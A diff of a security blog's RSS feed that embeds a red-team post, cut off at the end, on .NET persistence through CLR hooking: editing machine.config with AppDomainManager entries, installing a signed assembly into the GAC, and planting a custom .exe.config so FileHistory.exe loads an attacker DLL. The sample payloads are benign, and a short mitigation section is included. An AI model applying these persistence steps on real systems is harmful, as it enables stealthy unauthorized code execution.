@@ -1,1 +1,2687 @@
-<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[SecBytes]]></title><description><![CDATA[This is my description that will be used in the meta tags and important for search results]]></description><link>https://secbytes.net</link><image><url>https://secbytes.net/icons/icon-512x512.png</url><title>SecBytes</title><link>https://secbytes.net</link></image><generator>GatsbyJS</generator><lastBuildDate>Mon, 06 Apr 2020 04:29:26 GMT</lastBuildDate><atom:link href="https://secbytes.net/rss.xml" rel="self" type="application/rss+xml"/><item><title><![CDATA[Configuring our Machine for Persistence]]></title><description><![CDATA[CLR Hooking for Persistence via Config Files]]></description><link>https://secbytes.net/Configuring-our-Machine-for-Persistence</link><guid isPermaLink="false">https://secbytes.net/Configuring-our-Machine-for-Persistence</guid><dc:creator><![CDATA[NotoriousRebel]]></dc:creator><pubDate>Mon, 24 Feb 2020 00:00:00 GMT</pubDate></item><item><title><![CDATA[Hiding Your Tracks Bash History]]></title><description><![CDATA[Tricks to hide bash history.]]></description><link>https://secbytes.net/Hiding-Your-Tracks-Bash-History</link><guid isPermaLink="false">https://secbytes.net/Hiding-Your-Tracks-Bash-History</guid><dc:creator><![CDATA[Bad3r]]></dc:creator><pubDate>Mon, 20 Jan 2020 00:00:00 GMT</pubDate></item><item><title><![CDATA[Using and Abusing Aliases with PowerShell]]></title><description><![CDATA[Shimming Aliases with PowerShell]]></description><link>https://secbytes.net/Using-and-Abusing-Aliases-with-PowerShell</link><guid isPermaLink="false">https://secbytes.net/Using-and-Abusing-Aliases-with-PowerShell</guid><dc:creator><![CDATA[NotoriousRebel]]></dc:creator><pubDate>Sun, 24 Nov 2019 00:00:00 GMT</pubDate></item><item><title><![CDATA[SwagShop Hack The Box Writeup]]></title><description><![CDATA[Complete walkthrough for SwagShop on Hack The Box]]></description><link>https://secbytes.net/SwagShop-Hack-The-Box-Writeup</link><guid isPermaLink="false">https://secbytes.net/SwagShop-Hack-The-Box-Writeup</guid><dc:creator><![CDATA[Bad3r]]></dc:creator><pubDate>Sat, 28 Sep 2019 00:00:00 GMT</pubDate></item><item><title><![CDATA[The Hunt for LOLBAS]]></title><description><![CDATA[Using Powershell to Hunt for LOLBAS]]></description><link>https://secbytes.net/The-Hunt-for-LOLBAS</link><guid isPermaLink="false">https://secbytes.net/The-Hunt-for-LOLBAS</guid><dc:creator><![CDATA[NotoriousRebel]]></dc:creator><pubDate>Sat, 13 Jul 2019 00:00:00 GMT</pubDate></item><item><title><![CDATA[Power of Covenant]]></title><description><![CDATA[Deploying Covenant]]></description><link>https://secbytes.net/Power-of-Covenant</link><guid isPermaLink="false">https://secbytes.net/Power-of-Covenant</guid><dc:creator><![CDATA[NotoriousRebel]]></dc:creator><pubDate>Wed, 01 May 2019 00:00:00 GMT</pubDate></item></channel></rss>
+<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[SecBytes]]></title><description><![CDATA[This is my description that will be used in the meta tags and important for search results]]></description><link>https://secbytes.net</link><image><url>https://secbytes.net/icons/icon-512x512.png</url><title>SecBytes</title><link>https://secbytes.net</link></image><generator>GatsbyJS</generator><lastBuildDate>Wed, 08 Apr 2020 15:40:24 GMT</lastBuildDate><atom:link href="https://secbytes.net/rss.xml" rel="self" type="application/rss+xml"/><item><title><![CDATA[Configuring our Machine for Persistence]]></title><description><![CDATA[CLR Hooking for Persistence via Config Files]]></description><link>https://secbytes.net/Configuring-our-Machine-for-Persistence</link><guid isPermaLink="false">https://secbytes.net/Configuring-our-Machine-for-Persistence</guid><dc:creator><![CDATA[NotoriousRebel]]></dc:creator><pubDate>Mon, 24 Feb 2020 00:00:00 GMT</pubDate><content:encoded>function _extends() { _extends = Object.assign || function (target) { for (var i = 1; i &lt; arguments.length; i++) { var source = arguments[i]; for (var key in source) { if (Object.prototype.hasOwnProperty.call(source, key)) { target[key] = source[key]; } } } return target; }; return _extends.apply(this, arguments); }
+
+function _objectWithoutProperties(source, excluded) { if (source == null) return {}; var target = _objectWithoutPropertiesLoose(source, excluded); var key, i; if (Object.getOwnPropertySymbols) { var sourceSymbolKeys = Object.getOwnPropertySymbols(source); for (i = 0; i &lt; sourceSymbolKeys.length; i++) { key = sourceSymbolKeys[i]; if (excluded.indexOf(key) &gt;= 0) continue; if (!Object.prototype.propertyIsEnumerable.call(source, key)) continue; target[key] = source[key]; } } return target; }
+
+function _objectWithoutPropertiesLoose(source, excluded) { if (source == null) return {}; var target = {}; var sourceKeys = Object.keys(source); var key, i; for (i = 0; i &lt; sourceKeys.length; i++) { key = sourceKeys[i]; if (excluded.indexOf(key) &gt;= 0) continue; target[key] = source[key]; } return target; }
+
+/* @jsx mdx */
+var _frontmatter = {
+  &quot;title&quot;: &quot;Configuring our Machine for Persistence&quot;,
+  &quot;author&quot;: &quot;NotoriousRebel&quot;,
+  &quot;date&quot;: &quot;2020-02-24T00:00:00.000Z&quot;,
+  &quot;hero&quot;: &quot;./images/binding.jpg&quot;,
+  &quot;excerpt&quot;: &quot;CLR Hooking for Persistence via Config Files&quot;
+};
+
+var makeShortcode = function makeShortcode(name) {
+  return function MDXDefaultShortcode(props) {
+    console.warn(&quot;Component &quot; + name + &quot; was not imported, exported, or provided by MDXProvider as global scope&quot;);
+    return mdx(&quot;div&quot;, props);
+  };
+};
+
+var layoutProps = {
+  _frontmatter: _frontmatter
+};
+var MDXLayout = &quot;wrapper&quot;;
+return function MDXContent(_ref) {
+  var components = _ref.components,
+      props = _objectWithoutProperties(_ref, [&quot;components&quot;]);
+
+  return mdx(MDXLayout, _extends({}, layoutProps, props, {
+    components: components,
+    mdxType: &quot;MDXLayout&quot;
+  }), mdx(&quot;h3&quot;, {
+    &quot;id&quot;: &quot;introduction&quot;
+  }, &quot;Introduction&quot;), mdx(&quot;p&quot;, null, &quot;Preparing for an upcoming red teaming competition and \u201Cbecoming\u201D one with the MSDN documents,\nI stumbled across something very interesting. You may have noticed that when you create an .NET Framework application\nwith Visual Studio an app.config is created.\nA typical app.config looks like:&quot;), mdx(&quot;pre&quot;, null, mdx(&quot;code&quot;, _extends({
+    parentName: &quot;pre&quot;
+  }, {
+    &quot;className&quot;: &quot;language-xml&quot;
+  }), &quot;&lt;?xml version=\&quot;1.0\&quot; encoding=\&quot;utf-8\&quot; ?&gt;\n&lt;configuration&gt;\n    &lt;startup&gt; \n        &lt;supportedRuntime version=\&quot;v4.0\&quot; sku=\&quot;.NETFramework,Version=v4.7.2\&quot; /&gt;\n    &lt;/startup&gt;\n&lt;/configuration&gt;\n&quot;)), mdx(&quot;ul&quot;, null, mdx(&quot;li&quot;, {
+    parentName: &quot;ul&quot;
+  }, &quot;Configuration: Root element in every configuration file used by the Common Language Runtime  (CLR) and .NET Framework applications&quot;), mdx(&quot;li&quot;, {
+    parentName: &quot;ul&quot;
+  }, &quot;Startup: Element specifies the CLR startup information&quot;), mdx(&quot;li&quot;, {
+    parentName: &quot;ul&quot;
+  }, &quot;Version: Specifies version of the CLR the app supports &quot;), mdx(&quot;li&quot;, {
+    parentName: &quot;ul&quot;
+  }, &quot;Sku: Specifies which .NET Framework release the app supports&quot;)), mdx(&quot;p&quot;, null, &quot;That\u2019s great but why should you care? Remember what was just said, \u201CRoot element in every configuration file.\u201D\nThere are more configuration files besides app.config.\nThis is where our journey begins.&quot;), mdx(&quot;h3&quot;, {
+    &quot;id&quot;: &quot;note&quot;
+  }, &quot;Note&quot;), mdx(&quot;p&quot;, null, &quot;This post does not cover the internals of things such as Global Assembly Cache (GAC), CLR, or strong signed .NET assemblies.\nIf you need a primer on those,\nI highly suggest you check out &quot;, mdx(&quot;a&quot;, _extends({
+    parentName: &quot;p&quot;
+  }, {
+    &quot;href&quot;: &quot;https://twitter.com/am0nsec&quot;,
+    &quot;target&quot;: &quot;_blank&quot;,
+    &quot;rel&quot;: &quot;noreferrer&quot;
+  }), &quot;am0nsec\u2019s&quot;), &quot;\n&quot;, mdx(&quot;a&quot;, _extends({
+    parentName: &quot;p&quot;
+  }, {
+    &quot;href&quot;: &quot;https://www.contextis.com/en/blog/common-language-runtime-hook-for-persistence&quot;,
+    &quot;target&quot;: &quot;_blank&quot;,
+    &quot;rel&quot;: &quot;noreferrer&quot;
+  }), &quot;post&quot;), &quot; covering\na different technique for CLR hooking.&quot;), mdx(&quot;h3&quot;, {
+    &quot;id&quot;: &quot;digging-deeper&quot;
+  }, &quot;Digging Deeper&quot;), mdx(&quot;p&quot;, null, &quot;Exactly what other config files exist?\nBefore we get to that, we must first understand how the runtime locates assemblies.\nThere are four steps in the process:&quot;), mdx(&quot;ol&quot;, null, mdx(&quot;li&quot;, {
+    parentName: &quot;ol&quot;
+  }, &quot;Examining the configuration files&quot;), mdx(&quot;li&quot;, {
+    parentName: &quot;ol&quot;
+  }, &quot;Checking for previously referenced assemblies&quot;), mdx(&quot;li&quot;, {
+    parentName: &quot;ol&quot;
+  }, &quot;Checking the global assembly cache&quot;), mdx(&quot;li&quot;, {
+    parentName: &quot;ol&quot;
+  }, &quot;Locating the assembly through codebases or probing&quot;)), mdx(&quot;p&quot;, null, &quot;The first step is what we will be focusing on.\nThere are three configuration files.&quot;), mdx(&quot;div&quot;, {
+    &quot;className&quot;: &quot;Image__Medium&quot;
+  }, &quot;\n  &quot;, mdx(&quot;span&quot;, _extends({
+    parentName: &quot;div&quot;
+  }, {
+    &quot;className&quot;: &quot;gatsby-resp-image-wrapper&quot;,
+    &quot;style&quot;: {
+      &quot;position&quot;: &quot;relative&quot;,
+      &quot;display&quot;: &quot;block&quot;,
+      &quot;marginLeft&quot;: &quot;auto&quot;,
+      &quot;marginRight&quot;: &quot;auto&quot;,
+      &quot;maxWidth&quot;: &quot;951px&quot;
+    }
+  }), &quot;\n      &quot;, mdx(&quot;span&quot;, _extends({
+    parentName: &quot;span&quot;
+  }, {
+    &quot;className&quot;: &quot;gatsby-resp-image-background-image&quot;,
+    &quot;style&quot;: {
+      &quot;paddingBottom&quot;: &quot;22.187171398527862%&quot;,
+      &quot;position&quot;: &quot;relative&quot;,
+      &quot;bottom&quot;: &quot;0&quot;,
+      &quot;left&quot;: &quot;0&quot;,
+      &quot;backgroundImage&quot;: &quot;url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAABJ0AAASdAHeZh94AAAAjklEQVQY03WOWw6DIBBFXYSCgA0WCLAASsQaw/43dQWSJqaGj/Mxj3tmhhA+2LYNIQQcx4F931sdY0TOGed5IqVUZl9orcE5bxBCQCl9MEgp4ZyDrVjbUEo13oUqWde1UXvGGNRMVzjP803mikBBCIFxHDFN04Nfv4ar9F88MMbah957OO/wWpbu9Tu9nQs3p2zwDPMpsQAAAABJRU5ErkJggg==&apos;)&quot;,
+      &quot;backgroundSize&quot;: &quot;cover&quot;,
+      &quot;display&quot;: &quot;block&quot;
+    }
+  })), &quot;\n  &quot;, mdx(&quot;picture&quot;, {
+    parentName: &quot;span&quot;
+  }, &quot;\n        &quot;, mdx(&quot;source&quot;, _extends({
+    parentName: &quot;picture&quot;
+  }, {
+    &quot;srcSet&quot;: [&quot;/static/e0b427c286ecbbbece32c98dd0fc019d/50566/config_files.webp 951w&quot;],
+    &quot;sizes&quot;: &quot;(max-width: 951px) 100vw, 951px&quot;,
+    &quot;type&quot;: &quot;image/webp&quot;
+  })), &quot;\n        &quot;, mdx(&quot;source&quot;, _extends({
+    parentName: &quot;picture&quot;
+  }, {
+    &quot;srcSet&quot;: [&quot;/static/e0b427c286ecbbbece32c98dd0fc019d/ce125/config_files.png 951w&quot;],
+    &quot;sizes&quot;: &quot;(max-width: 951px) 100vw, 951px&quot;,
+    &quot;type&quot;: &quot;image/png&quot;
+  })), &quot;\n        &quot;, mdx(&quot;img&quot;, _extends({
+    parentName: &quot;picture&quot;
+  }, {
+    &quot;className&quot;: &quot;gatsby-resp-image-image&quot;,
+    &quot;src&quot;: &quot;/static/e0b427c286ecbbbece32c98dd0fc019d/ce125/config_files.png&quot;,
+    &quot;alt&quot;: &quot;Lists different config files&quot;,
+    &quot;title&quot;: &quot;Lists different config files&quot;,
+    &quot;loading&quot;: &quot;lazy&quot;,
+    &quot;style&quot;: {
+      &quot;width&quot;: &quot;100%&quot;,
+      &quot;height&quot;: &quot;100%&quot;,
+      &quot;margin&quot;: &quot;0&quot;,
+      &quot;verticalAlign&quot;: &quot;middle&quot;,
+      &quot;position&quot;: &quot;absolute&quot;,
+      &quot;top&quot;: &quot;0&quot;,
+      &quot;left&quot;: &quot;0&quot;
+    }
+  })), &quot;\n      &quot;), &quot;\n    &quot;)), mdx(&quot;p&quot;, null, &quot;We already covered the application configuration file.\nBut what about the other two?&quot;), mdx(&quot;p&quot;, null, &quot;The publisher policy file&quot;), mdx(&quot;ul&quot;, null, mdx(&quot;li&quot;, {
+    parentName: &quot;ul&quot;
+  }, &quot;Distributed by a component publisher as a fix or update to a shared component.&quot;), mdx(&quot;li&quot;, {
+    parentName: &quot;ul&quot;
+  }, &quot;Affects all applications that use a shared component.&quot;)), mdx(&quot;p&quot;, null, mdx(&quot;strong&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;And finally:&quot;)), mdx(&quot;p&quot;, null, &quot;The machine configuration file&quot;), mdx(&quot;ul&quot;, null, mdx(&quot;li&quot;, {
+    parentName: &quot;ul&quot;
+  }, &quot;Takes precedence over all other configuration settings&quot;), mdx(&quot;li&quot;, {
+    parentName: &quot;ul&quot;
+  }, &quot;Applied to the entire machine.&quot;), mdx(&quot;li&quot;, {
+    parentName: &quot;ul&quot;
+  }, &quot;Resides on the local computer in the config subdirectory&quot;), mdx(&quot;li&quot;, {
+    parentName: &quot;ul&quot;
+  }, &quot;Can be used by administrators to specify assembly binding\nrestrictions that are local to the computer&quot;), mdx(&quot;li&quot;, {
+    parentName: &quot;ul&quot;
+  }, &quot;Requires administrative permissions to modify&quot;)), mdx(&quot;h3&quot;, {
+    &quot;id&quot;: &quot;understanding-machineconfig&quot;
+  }, &quot;Understanding machine.config&quot;), mdx(&quot;p&quot;, null, &quot;Where is it located?&quot;), mdx(&quot;p&quot;, null, &quot;Simply type this in PowerShell:&quot;), mdx(&quot;pre&quot;, null, mdx(&quot;code&quot;, _extends({
+    parentName: &quot;pre&quot;
+  }, {
+    &quot;className&quot;: &quot;language-powershell&quot;
+  }), &quot;[System.Runtime.InteropServices.RuntimeEnvironment]::SystemConfigurationFile\n&quot;)), mdx(&quot;p&quot;, null, &quot;You will most likely get:\nC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\config\\machine.config&quot;), mdx(&quot;p&quot;, null, &quot;There is also one here:\nC:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\config\\machine.config&quot;), mdx(&quot;p&quot;, null, mdx(&quot;strong&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;There are also config files in the 32-bit version of the .NET Framework.&quot;)), mdx(&quot;p&quot;, null, &quot;According to &quot;, mdx(&quot;a&quot;, _extends({
+    parentName: &quot;p&quot;
+  }, {
+    &quot;href&quot;: &quot;https://docs.microsoft.com/en-us/dotnet/framework/configure-apps/&quot;,
+    &quot;target&quot;: &quot;_blank&quot;,
+    &quot;rel&quot;: &quot;noreferrer&quot;
+  }), &quot;Microsoft&quot;), &quot;:&quot;), mdx(&quot;p&quot;, null, &quot;\u201CThe configuration system first looks in the machine configuration file for the\nappSettings element and other configuration sections that a developer might define.\u201D&quot;), mdx(&quot;p&quot;, null, &quot;It\u2019s those other sections that allow us to get persistence.\nOne section in particular stands out, the runtime section!&quot;), mdx(&quot;p&quot;, null, &quot;In total, the runtime section, its parent and child elements\ntotal 55 items.&quot;), mdx(&quot;p&quot;, null, &quot;However, we only care about two:&quot;), mdx(&quot;ol&quot;, null, mdx(&quot;li&quot;, {
+    parentName: &quot;ol&quot;
+  }, mdx(&quot;a&quot;, _extends({
+    parentName: &quot;li&quot;
+  }, {
+    &quot;href&quot;: &quot;https://docs.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element&quot;,
+    &quot;target&quot;: &quot;_blank&quot;,
+    &quot;rel&quot;: &quot;noreferrer&quot;
+  }), &quot;appDomainManagerType&quot;)), mdx(&quot;li&quot;, {
+    parentName: &quot;ol&quot;
+  }, mdx(&quot;a&quot;, _extends({
+    parentName: &quot;li&quot;
+  }, {
+    &quot;href&quot;: &quot;https://docs.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element&quot;,
+    &quot;target&quot;: &quot;_blank&quot;,
+    &quot;rel&quot;: &quot;noreferrer&quot;
+  }), &quot;appDomainManagerAssembly&quot;))), mdx(&quot;h3&quot;, {
+    &quot;id&quot;: &quot;understanding-appdomainmanager--appdomainmanagerassembly&quot;
+  }, &quot;Understanding appDomainManager &amp; appDomainManagerAssembly&quot;), mdx(&quot;p&quot;, null, &quot;To understand why we care about those two elements, we must first understand\nwhat an AppDomain is. AppDomains allow  untrusted third-party\ncode to run in an existing process, essentially a logical container for a set of assemblies.\nThe appDomainManager class allows a host to override CLR default behavior by\nusing managed code instead of unmanaged code.&quot;), mdx(&quot;p&quot;, null, &quot;In order to achieve this, we need to create a class that derives from AppDomainManager\nwhich initializes a new domain. The appDomainManager element can be configured in the runtime section\nof a configuration file. This is accomplished via the elements appDomainManagerAssembly and appDomainManagerType.\nThe class that derives from AppDomainManager\nneeds to be installed into the GAC because\nthe assembly needs to be granted full-trust.\nAll assemblies in the GAC are always granted full-trust.&quot;), mdx(&quot;p&quot;, null, mdx(&quot;strong&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;TLDR:&quot;), &quot;\nWe can create a class that derives from appDomainManager class\nthat initializes a new domain to run our code.\nThe InitializeNewDomain method is called on the new instance of AppDomainManager.\nAllowing us to hook all calls to AppDomain.CreateDomain to our AppDomainManager which in turn will run our code.&quot;), mdx(&quot;h3&quot;, {
+    &quot;id&quot;: &quot;putting-the-pieces-altogether&quot;
+  }, &quot;Putting the Pieces Altogether&quot;), mdx(&quot;p&quot;, null, &quot;Now that we understand what machine.config and appDomains are\nand how we can leverage them, it\u2019s time put all the pieces together\nto accomplish persistence. There are a few things we need to perform:&quot;), mdx(&quot;ol&quot;, null, mdx(&quot;li&quot;, {
+    parentName: &quot;ol&quot;
+  }, &quot;Generate a keyfile. Simply do that with sn -k key.snk, &quot;, mdx(&quot;a&quot;, _extends({
+    parentName: &quot;li&quot;
+  }, {
+    &quot;href&quot;: &quot;https://docs.microsoft.com/en-us/dotnet/framework/tools/sn-exe-strong-name-tool&quot;,
+    &quot;target&quot;: &quot;_blank&quot;,
+    &quot;rel&quot;: &quot;noreferrer&quot;
+  }), &quot;sn&quot;), &quot; standing for strong name tool&quot;), mdx(&quot;li&quot;, {
+    parentName: &quot;ol&quot;
+  }, &quot;Create a strong signed .NET assembly using our newly created keyfile\nwith an assembly that derives from AppDomainManager\nand overrides InitiliazeNewDomain&quot;), mdx(&quot;li&quot;, {
+    parentName: &quot;ol&quot;
+  }, &quot;Install that assembly onto the GAC using &quot;, mdx(&quot;a&quot;, _extends({
+    parentName: &quot;li&quot;
+  }, {
+    &quot;href&quot;: &quot;https://docs.microsoft.com/en-us/dotnet/framework/tools/gacutil-exe-gac-tool&quot;,
+    &quot;target&quot;: &quot;_blank&quot;,
+    &quot;rel&quot;: &quot;noreferrer&quot;
+  }), &quot;gacutil&quot;), &quot;,\nC# via &quot;, mdx(&quot;a&quot;, _extends({
+    parentName: &quot;li&quot;
+  }, {
+    &quot;href&quot;: &quot;https://docs.microsoft.com/en-us/dotnet/api/system.enterpriseservices.internal.publish.gacinstall&quot;,
+    &quot;target&quot;: &quot;_blank&quot;,
+    &quot;rel&quot;: &quot;noreferrer&quot;
+  }), &quot;Publish.GacInstall&quot;), &quot;,\nor PowerShell via this amazing &quot;, mdx(&quot;a&quot;, _extends({
+    parentName: &quot;li&quot;
+  }, {
+    &quot;href&quot;: &quot;https://gitlab.com/snippets/1878274&quot;,
+    &quot;target&quot;: &quot;_blank&quot;,
+    &quot;rel&quot;: &quot;noreferrer&quot;
+  }), &quot;script&quot;)), mdx(&quot;li&quot;, {
+    parentName: &quot;ol&quot;
+  }, &quot;Modify machine.config\u2019s runtime element attribute with the appDomainType and appDomainManagerAssembly elements:&quot;)), mdx(&quot;p&quot;, null, &quot;To get the appDomainManagerAssembly you can &quot;), mdx(&quot;pre&quot;, null, mdx(&quot;code&quot;, _extends({
+    parentName: &quot;pre&quot;
+  }, {
+    &quot;className&quot;: &quot;language-xml&quot;
+  }), &quot;&lt;runtime&gt;  \n    &lt;appDomainManagerType value=\&quot;Context Name\&quot; /&gt;  \n    &lt;appDomainManagerAssembly   \n        value=\&quot;Signed, Version=1.0.0.0, Culture=neutral, PublicKeyToken=token\&quot; /&gt;  \n&lt;/runtime&gt; \n&quot;)), mdx(&quot;p&quot;, null, &quot;Luckily machine.config is simply an XML file so it\u2019s very easy to modify.\nThere also exists the &quot;, mdx(&quot;a&quot;, _extends({
+    parentName: &quot;p&quot;
+  }, {
+    &quot;href&quot;: &quot;https://docs.microsoft.com/en-us/dotnet/api/system.configuration&quot;,
+    &quot;target&quot;: &quot;_blank&quot;,
+    &quot;rel&quot;: &quot;noreferrer&quot;
+  }), &quot;System.Configuration&quot;), &quot;\nnamespace, which also could have been utilized.\nHowever, the xml method was personally much easier to use.&quot;), mdx(&quot;h3&quot;, {
+    &quot;id&quot;: &quot;demo-time&quot;
+  }, &quot;Demo Time&quot;), mdx(&quot;p&quot;, null, &quot;Putting all those pieces together in a simple program\nwhich just requires you to put the keyfile in the\ncorrect spot. This automates the process :)&quot;), mdx(&quot;p&quot;, null, &quot;Assemblies installed onto the GAC are located here:&quot;), mdx(&quot;p&quot;, null, &quot;C:\\Windows\\Microsoft.NET\\assembly&quot;), mdx(&quot;p&quot;, null, &quot;You will most likely see three folders:&quot;), mdx(&quot;ul&quot;, null, mdx(&quot;li&quot;, {
+    parentName: &quot;ul&quot;
+  }, &quot;GAC_32 : For assemblies targeting 32-bit platforms&quot;), mdx(&quot;li&quot;, {
+    parentName: &quot;ul&quot;
+  }, &quot;GAC_64 : For assemblies targeting 64-bit platforms&quot;), mdx(&quot;li&quot;, {
+    parentName: &quot;ul&quot;
+  }, &quot;GAC_MSIL : For assemblies targeting both 32-bit and 64-bit platforms&quot;)), mdx(&quot;p&quot;, null, &quot;You will notice our strong-named assembly called test is installed in GAC_MSIL&quot;), mdx(&quot;p&quot;, null, &quot;One of the most important parts is where we create the class that\ninherits from appDomainManager.&quot;), mdx(&quot;pre&quot;, null, mdx(&quot;code&quot;, _extends({
+    parentName: &quot;pre&quot;
+  }, {
+    &quot;className&quot;: &quot;language-csharp&quot;
+  }), &quot;using System;\n    namespace Context {\n        public sealed class ConfigHooking : AppDomainManager {\n            public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {\n                System.Diagnostics.Process.Start(\&quot;\&quot;calc.exe\&quot;\&quot;);\n                return;\n            }\n        }\n    }\n&quot;)), mdx(&quot;p&quot;, null, mdx(&quot;img&quot;, _extends({
+    parentName: &quot;p&quot;
+  }, {
+    &quot;src&quot;: &quot;/22f560d519458db961352e625a13d66a/works.gif&quot;,
+    &quot;alt&quot;: &quot;Demo&quot;
+  }))), mdx(&quot;p&quot;, null, &quot;This is running our code that modifies machine.config, which means\nthat any .NET assembly that is ran will run our code as well.&quot;), mdx(&quot;p&quot;, null, &quot;The full code can be found here:\n&quot;, mdx(&quot;a&quot;, _extends({
+    parentName: &quot;p&quot;
+  }, {
+    &quot;href&quot;: &quot;https://github.com/NotoriousRebel/ConfigPersist/&quot;,
+    &quot;target&quot;: &quot;_blank&quot;,
+    &quot;rel&quot;: &quot;noreferrer&quot;
+  }), &quot;ConfigPersist&quot;)), mdx(&quot;h3&quot;, {
+    &quot;id&quot;: &quot;creating-configs-for-arbitrary-net-assemblies&quot;
+  }, &quot;Creating Configs for Arbitrary .NET Assemblies&quot;), mdx(&quot;p&quot;, null, &quot;Thank you to &quot;, mdx(&quot;a&quot;, _extends({
+    parentName: &quot;p&quot;
+  }, {
+    &quot;href&quot;: &quot;https://twitter.com/subtee&quot;,
+    &quot;target&quot;: &quot;_blank&quot;,
+    &quot;rel&quot;: &quot;noreferrer&quot;
+  }), &quot;@subTee&quot;), &quot; for the amazing research on this technique.\nRemember what was said earlier about how the runtime locates assemblies.\nSpecifically number 4:&quot;), mdx(&quot;p&quot;, null, mdx(&quot;strong&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;Locating the assembly through codebases or probing&quot;)), mdx(&quot;p&quot;, null, &quot;We can also take any arbitrary .NET assembly\nfor example, FileHistory.exe and create a custom config for it\nsuch as FileHistory.exe.config looking like this:&quot;), mdx(&quot;pre&quot;, null, mdx(&quot;code&quot;, _extends({
+    parentName: &quot;pre&quot;
+  }, {
+    &quot;className&quot;: &quot;language-xml&quot;
+  }), &quot;&lt;configuration&gt;\n   &lt;runtime&gt;\n      &lt;assemblyBinding xmlns=\&quot;urn:schemas-microsoft-com:asm.v1\&quot;&gt;\n         &lt;probing privatePath=\&quot;C:\\Windows\\System32\\com;\&quot; /&gt;\n      &lt;/assemblyBinding&gt;\n      &lt;appDomainManagerAssembly value=\&quot;ArbConfig, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null\&quot; /&gt;\n      &lt;appDomainManagerType value=\&quot;MyAppDomainManager\&quot; /&gt;\n   &lt;/runtime&gt;\n&lt;/configuration&gt;\n&quot;)), mdx(&quot;p&quot;, null, &quot;ArbConfig being the name of the unsigned assembly.\nWe can then simply place that config file\ninside System32 and the next time FileHistory.exe\nis ran our code will be ran instead.&quot;), mdx(&quot;ol&quot;, null, mdx(&quot;li&quot;, {
+    parentName: &quot;ol&quot;
+  }, &quot;Create your assembly that derives from AppDomainManager.&quot;), mdx(&quot;li&quot;, {
+    parentName: &quot;ol&quot;
+  }, &quot;Place your unsigned assembly in the same directory\nas the .NET assembly you want to affect.&quot;), mdx(&quot;li&quot;, {
+    parentName: &quot;ol&quot;
+  }, &quot;Modify your config with the privatePath being equal\nto where you placed your assembly.&quot;), mdx(&quot;li&quot;, {
+    parentName: &quot;ol&quot;
+  }, &quot;Place the config file in the same directory or a subdirectory\nas the .NET assembly you want to affect.&quot;)), mdx(&quot;p&quot;, null, mdx(&quot;img&quot;, _extends({
+    parentName: &quot;p&quot;
+  }, {
+    &quot;src&quot;: &quot;/817df49b83adbe093073518465330199/second_demo.gif&quot;,
+    &quot;alt&quot;: &quot;second_demo&quot;
+  }))), mdx(&quot;p&quot;, null, &quot;This creates an arbitrary config for FileHistory which\nmeans when FileHistory is it runs our code in ArbConfig.dll first.&quot;), mdx(&quot;p&quot;, null, &quot;The code for ArbConfig.dll:&quot;), mdx(&quot;pre&quot;, null, mdx(&quot;code&quot;, _extends({
+    parentName: &quot;pre&quot;
+  }, {
+    &quot;className&quot;: &quot;language-csharp&quot;
+  }), &quot;using System;\nusing System.Reflection;\nusing System.EnterpriseServices;\nusing System.Runtime.InteropServices;\n\npublic sealed class MyAppDomainManager : AppDomainManager\n{\n    public override void InitializeNewDomain(AppDomainSetup appDomainInfo)\n    {\n        System.Windows.Forms.MessageBox.Show(\&quot;Config Files are fun\&quot;);\n        return;\n    }\n}\n&quot;)), mdx(&quot;p&quot;, null, &quot;For more information on this technique\nread about the probing &quot;, mdx(&quot;a&quot;, _extends({
+    parentName: &quot;p&quot;
+  }, {
+    &quot;href&quot;: &quot;https://docs.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element&quot;,
+    &quot;target&quot;: &quot;_blank&quot;,
+    &quot;rel&quot;: &quot;noreferrer&quot;
+  }), &quot;element&quot;), &quot;.&quot;), mdx(&quot;h3&quot;, {
+    &quot;id&quot;: &quot;mitigation&quot;
+  }, &quot;Mitigation&quot;), mdx(&quot;ul&quot;, null, mdx(&quot;li&quot;, {
+    parentName: &quot;ul&quot;
+  }, &quot;Monitoring for modifications to machine.config&quot;), mdx(&quot;li&quot;, {
+    parentName: &quot;ul&quot;
+  }, &quot;Monitoring for dynamic compilation of C# code&quot;)), mdx(&quot;h3&quot;, {
+    &quot;id&quot;: &quot;whats-next&quot;
+  }, &quot;What\u2019s Next?&quot;), mdx(&quot;ul&quot;, null, mdx(&quot;li&quot;, {
+    parentName: &quot;ul&quot;
+  }, &quot;Look into automating the creation of configs for any arbitrary .NET assembly&quot;), mdx(&quot;li&quot;, {
+    parentName: &quot;ul&quot;
+  }, &quot;Dig deeper into just how powerful machine.config is&quot;), mdx(&quot;li&quot;, {
+    parentName: &quot;ul&quot;
+  }, &quot;Research .NET Core runtime persistence mechanisms&quot;)), mdx(&quot;h3&quot;, {
+    &quot;id&quot;: &quot;closing-thoughts&quot;
+  }, &quot;Closing Thoughts&quot;), mdx(&quot;p&quot;, null, &quot;The concept of leveraging built-in config files for persistence is quite fascinating\nas with the shift from PowerShell to .NET tradecraft, .NET attacks will become\nmuch more common and frequent.&quot;), mdx(&quot;p&quot;, null, mdx(&quot;strong&quot;, {
+    parentName: &quot;p&quot;
+  }, &quot;Shout outs to:&quot;)), mdx(&quot;ul&quot;, null, mdx(&quot;li&quot;, {
+    parentName: &quot;ul&quot;
+  }, mdx(&quot;a&quot;, _extends({
+    parentName: &quot;li&quot;
+  }, {
+    &quot;href&quot;: &quot;https://twitter.com/am0nsec&quot;,
